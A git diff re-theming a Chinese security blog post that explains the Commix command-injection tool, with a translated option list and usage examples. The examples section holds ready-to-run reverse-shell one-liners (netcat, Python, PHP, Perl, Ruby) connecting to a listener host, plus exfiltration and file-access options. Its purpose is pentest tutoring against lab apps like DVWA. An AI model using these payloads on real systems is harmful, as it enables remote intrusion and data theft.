@@ -1,1023 +1,278 @@
-<!doctype html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
 
+    
 
+    <title>
+      Commix命令详解 | Z3R0YU 
+    </title>
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
-  
-
-  
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="z3r0yu">
     
     
-  
 
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="ZEROYU, SEC" />
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
-
-
-
-
-
-
-<meta name="description" content="介绍项目地址：https://github.com/stasinopoulos/commix
+    <meta name="description" content="介绍项目地址：https://github.com/stasinopoulos/commix
 Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
 使用12345678910111213141516171819202122232425262">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Commix命令详解">
+<meta property="og:title" content="Commix命令详解 | Z3R0YU">
 <meta property="og:url" content="http://zer0yu.github.io/2017/01/21/Commix命令详解/index.html">
-<meta property="og:site_name" content="ZEROYU">
+<meta property="og:site_name" content="Z3R0YU">
 <meta property="og:description" content="介绍项目地址：https://github.com/stasinopoulos/commix
 Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
 使用12345678910111213141516171819202122232425262">
 <meta property="og:updated_time" content="2017-01-21T15:00:27.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Commix命令详解">
+<meta name="twitter:title" content="Commix命令详解 | Z3R0YU">
 <meta name="twitter:description" content="介绍项目地址：https://github.com/stasinopoulos/commix
 Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。
 使用12345678910111213141516171819202122232425262">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
 
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post"},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://zer0yu.github.io/2017/01/21/Commix命令详解/"/>
-
-
-
-
-
-  <title> Commix命令详解 | ZEROYU </title>
 </head>
+<body>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
 
-  
-
-
-
-  <script type="text/javascript">
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?414e74bab07e7101a26a8ca95416288a";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
-
-
-
-
-
-  
-  
     
-  
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
+<header class="panel-cover panel-cover--collapsed">
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-meta ">
-  
 
-  <div class="custom-logo-site-title">
-    <a href="/"  class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <span class="site-title">ZEROYU</span>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-    
-      <p class="site-subtitle"></p>
-    
-</div>
-
-<div class="site-nav-toggle">
-  <button>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-  </button>
-</div>
-
-<nav class="site-nav">
-  
+  <div class="panel-main">
 
   
-    <ul id="menu" class="menu">
-      
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
 
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
-        </li>
-      
-    </ul>
-  
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Z3R0YU</a></h1>
+        <hr class="panel-cover__divider" />
 
-  
-    <div class="site-search">
-      
-  <div class="popup">
- <span class="search-icon fa fa-search"></span>
- <input type="text" id="local-search-input">
- <div id="local-search-result"></div>
- <span class="popup-btn-close">close</span>
-</div>
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archives" title="" class="">归档</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
 
 
-    </div>
-  
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zer0yu" title="z3r0yu on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+
+    <!-- China social icon -->
+    <!--
+
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">Douban</span>
+        </a>
+      </li>
+    -->
+
+      <li class="navigation__item">
+        <a href="https://weibo.com/Z3r0yu" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+
+
+
+
+  </ul>
 </nav>
 
 
 
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/21/Commix命令详解/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                Commix命令详解
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-21T22:58:54+08:00">
-                2017-01-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/21/Commix命令详解/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/21/Commix命令详解/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/21/Commix命令详解/" class="leancloud_visitors" data-flag-title="Commix命令详解">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
         </div>
-      </header>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">Commix命令详解</h1>
+
     
 
+    <div class="post-meta">
+      <time datetime="2017-01-21" class="post-meta__date date">2017-01-21</time> 
 
-    <div class="post-body" itemprop="articleBody">
+      <span class="post-meta__tags tags">
 
-      
-      
+          
 
-      
-        <h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>项目地址：<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></p>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>项目地址：<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></p>
 <p>Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。</p>
 <h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">选项：</div><div class="line">    -v 　　　　　　　　　　VERBOSE详细程度级别（0-1，默认值：0）。</div><div class="line">    --version　　　　 　　显示版本号并退出。</div><div class="line">    --output-dir=.. 　　设置自定义输出目录路径。</div><div class="line">    -s SESSION_FILE　　 从存储（.sqlite）文件加载会话。</div><div class="line">    --flush-session　　 刷新当前目标的会话文件。</div><div class="line">    --ignore-session　　忽略存储在会话文件中的结果。</div><div class="line"></div><div class="line">  目标：</div><div class="line">    -u URL，--url = URL　　目标URL。</div><div class="line">    --url-reload　　　　　　在命令执行后重新加载目标URL。</div><div class="line">    -l LOGFILE　　　　　　　解析来自HTTP代理日志文件的目标和数据。</div><div class="line">    --crawl = CRAWLDEPTH  从目标网址开始抓取网站（1-2，默认值：0）。</div><div class="line"></div><div class="line">  请求：</div><div class="line">    --data=DATA　　　　　　要通过POST发送的数据字符串。</div><div class="line">    --host=HOST 　　　　　 HTTP主机头。</div><div class="line">    --referer=REFERER 　　HTTP Referer标头。</div><div class="line">    --user-agent=AGENT 　HTTP用户代理头。</div><div class="line">    --random-agent　　　　使用随机选择的HTTP User-Agent头。</div><div class="line">    --param-del=PDEL　　 设置分割参数值的字符。</div><div class="line">    --cookie=COOKIE 　　 HTTP Cookie头。</div><div class="line">    --cookie-del=CDEL 　 设置分割cookie值的字符。</div><div class="line">    --headers=HEADERS　  额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。</div><div class="line">    --proxy=PROXY　　　　 使用HTTP代理（例如“127.0.0.1:8080”）。</div><div class="line">    --tor　　　　　　　　　 使用Tor网络。</div><div class="line">    --tor-port=...  　　  设置Tor代理端口（默认值：8118）。</div><div class="line">    --auth-url=...　　　  登录面板URL。</div><div class="line">    --auth-data =AUTH 　　登录参数和数据。</div><div class="line">    --auth-type =AUTH 　　HTTP认证类型（例如“基本”或“摘要”）。</div><div class="line">    --auth-cred =AUTH 　　HTTP身份验证凭据（例如“admin：admin”）。</div><div class="line">    --ignore-401　　　　　 忽略HTTP错误401（未授权）。</div><div class="line">    --force-ssl　　　　　　强制使用SSL / HTTPS。</div><div class="line"></div><div class="line">  枚举：</div><div class="line">    这些选项可用于枚举目标主机。</div><div class="line">    --all　　　　　　　　　　　　检索一切。</div><div class="line">    --current-user　　　　　　 检索当前用户名。</div><div class="line">    --hostname　　　　　　　　　检索当前主机名。</div><div class="line">    --is-root　　　　　　　　　 检查当前用户是否具有root权限。</div><div class="line">    --is-admin　　　　　　　　　检查当前用户是否具有管理员权限。</div><div class="line">    --sys-info　　　　　　　　　检索系统信息。</div><div class="line">    --users　　　　　　　　　　 检索系统用户。</div><div class="line">    --passwords　　　　　　　　 检索系统用户密码散列。</div><div class="line">    --privileges　　　　　　　 检索系统用户权限。</div><div class="line">    --ps-version　　　　　　　 检索PowerShell的版本号。</div><div class="line"></div><div class="line">  文件访问：</div><div class="line">    这些选项可用于访问目标主机上的文件。</div><div class="line">    --file-read = FILE ..　　从目标主机读取文件。</div><div class="line">    --file-write = FIL ..　　写入目标主机上的文件。</div><div class="line">    --file-upload = FI ..　　在目标主机上上传文件。</div><div class="line">    --file-dest = FILE ..　　写入和/或上传到的主机的绝对文件路径。</div><div class="line"></div><div class="line">  模块：</div><div class="line">    这些选项可用于增加检测和/或注射能力。</div><div class="line">    --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。  （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。</div><div class="line">    --dns-server = DNS ..“DNS exfiltration”注入模块。　　（用于DNS筛选攻击的域名）。</div><div class="line">    --shellshock“炮弹”注射模块。</div><div class="line">  注射：</div><div class="line">    这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。</div><div class="line">    -p TEST_PARAMETER　　　　可测试参数。</div><div class="line">    --suffix = SUFFIX　　　　注入有效负载后缀字符串。</div><div class="line">    --prefix = PREFIX　　　　注入有效负载前缀字符串。</div><div class="line">    --technique = TECH　　　指定要使用的进样技术。</div><div class="line">    --maxlen = MAXLEN　　　 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。</div><div class="line">    --delay = DELAY　　　　 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。</div><div class="line">    --tmp-path = TMP_P ..  设置Web服务器的临时目录的绝对路径。</div><div class="line">    --root-dir = SRV_R ..  设置Web服务器根目录的绝对路径。</div><div class="line">    --alter-shell = AL ..  使用另一个os-shell（例如&apos;Python&apos;）。</div><div class="line">    --os-cmd = OS_CMD　　　 执行单个操作系统命令。</div><div class="line">    --os = OS　　　　　　　　将后端操作系统强制为此值。</div><div class="line">    --tamper = TAMPER　　　使用给定脚本篡改注射数据。</div><div class="line"></div><div class="line">  检测：</div><div class="line">    这些选项可用于自定义检测阶段。</div><div class="line"></div><div class="line">    --level = LEVEL　　要执行的测试级别（1-3，默认值：1）。</div><div class="line">    --skip-calc　　　　在检测期间跳过数学计算</div><div class="line">    --dependencies　　检查第三方（非内核）依赖关系。</div><div class="line">    --skip-waf　　　　绕过启发式检测WAF / IPS / IDS保护。</div></pre></td></tr></table></figure>
 <h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″</div><div class="line"></div><div class="line"></div><div class="line">Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）</div><div class="line"></div><div class="line">测试漏洞web应用Damn</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</div><div class="line">使用注入攻击Payload参数测试php-Charts 1.0</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;</div><div class="line">使用特殊的头和HTTP代理测试OWASP Mutillidae</div><div class="line"></div><div class="line">python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</div><div class="line">使用ICMP渗漏（exfiltration）技术测试Persistence</div><div class="line"></div><div class="line">su -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot;</div><div class="line"> </div><div class="line"></div><div class="line">配合一些反弹shell</div><div class="line"></div><div class="line">1. Python-reverse-shell:</div><div class="line">　　python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’</div><div class="line">2. PHP-reverse-shell:</div><div class="line">　　php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’</div><div class="line">3. Perl-reverse-shell:</div><div class="line">　　perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’</div><div class="line">4. Ruby-reverse-shell:</div><div class="line">　　ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’</div></pre></td></tr></table></figure>
 
-      
-    </div>
+  </section>
 
-    <div>
-      
-        
+  <section class="post-comments">
 
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
 
 
-    <footer class="post-footer">
-      
+</article>
 
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/01/21/commix使用示例/" rel="next" title="commix使用示例">
-                <i class="fa fa-chevron-left"></i> commix使用示例
-              </a>
-            
-          </div>
 
-          <span class="post-nav-divider"></span>
+            <footer class="footer">
 
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/01/21/linux-csi-tools部署记录/" rel="prev" title="linux-csi-tools部署记录">
-                linux-csi-tools部署记录 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
         </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
     </div>
-  </div>
 
-          
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
     
-      <div class="ds-thread" data-thread-key="2017/01/21/Commix命令详解/"
-           data-title="Commix命令详解" data-url="http://zer0yu.github.io/2017/01/21/Commix命令详解/">
-      </div>
+
     
-  </div>
 
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/images/avatar.gif"
-               alt="ZEROYU" />
-          <p class="site-author-name" itemprop="name">ZEROYU</p>
-          <p class="site-description motion-element" itemprop="description">一只单线程HACKER</p>
-        </div>
-        <nav class="site-state motion-element">
-        
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">34</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
-        
-          <div class="feed-link motion-element">
-            <a href="/atom.xml" rel="alternate">
-              <i class="fa fa-rss"></i>
-              RSS
-            </a>
-          </div>
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/zer0yu" target="_blank" title="Github">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Github
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="http://weibo.com/Z3r0yu" target="_blank" title="Weibo">
-                  
-                    <i class="fa fa-fw fa-weibo"></i>
-                  
-                  Weibo
-                </a>
-              </span>
-            
-              <span class="links-of-author-item">
-                <a href="zeroyu.xyz@gmail.com" target="_blank" title="Email">
-                  
-                    <i class="fa fa-fw fa-globe"></i>
-                  
-                  Email
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友情链接
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://blog.csdn.net/zeroyu_xyz" title="我的CSDN博客" target="_blank">我的CSDN博客</a>
-                </li>
-              
-            </ul>
-          </div>
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用"><span class="nav-number">2.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例子"><span class="nav-number">3.</span> <span class="nav-text">例子</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2015 - 
-  <span itemprop="copyrightYear">2017</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">ZEROYU</span>
-</div>
-
-
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">ZEROYU</a> 强力驱动
-</div>
-
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
-
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-
-<script>
-(function(){
-    var bp = document.createElement('script');
-    bp.src = '//push.zhanzhang.baidu.com/push.js';
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
-</script>
-
-
-        
-
-        
-      </div>
-    </footer>
-
-    <div class="back-to-top">
-      <i class="fa fa-arrow-up"></i>
-    </div>
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
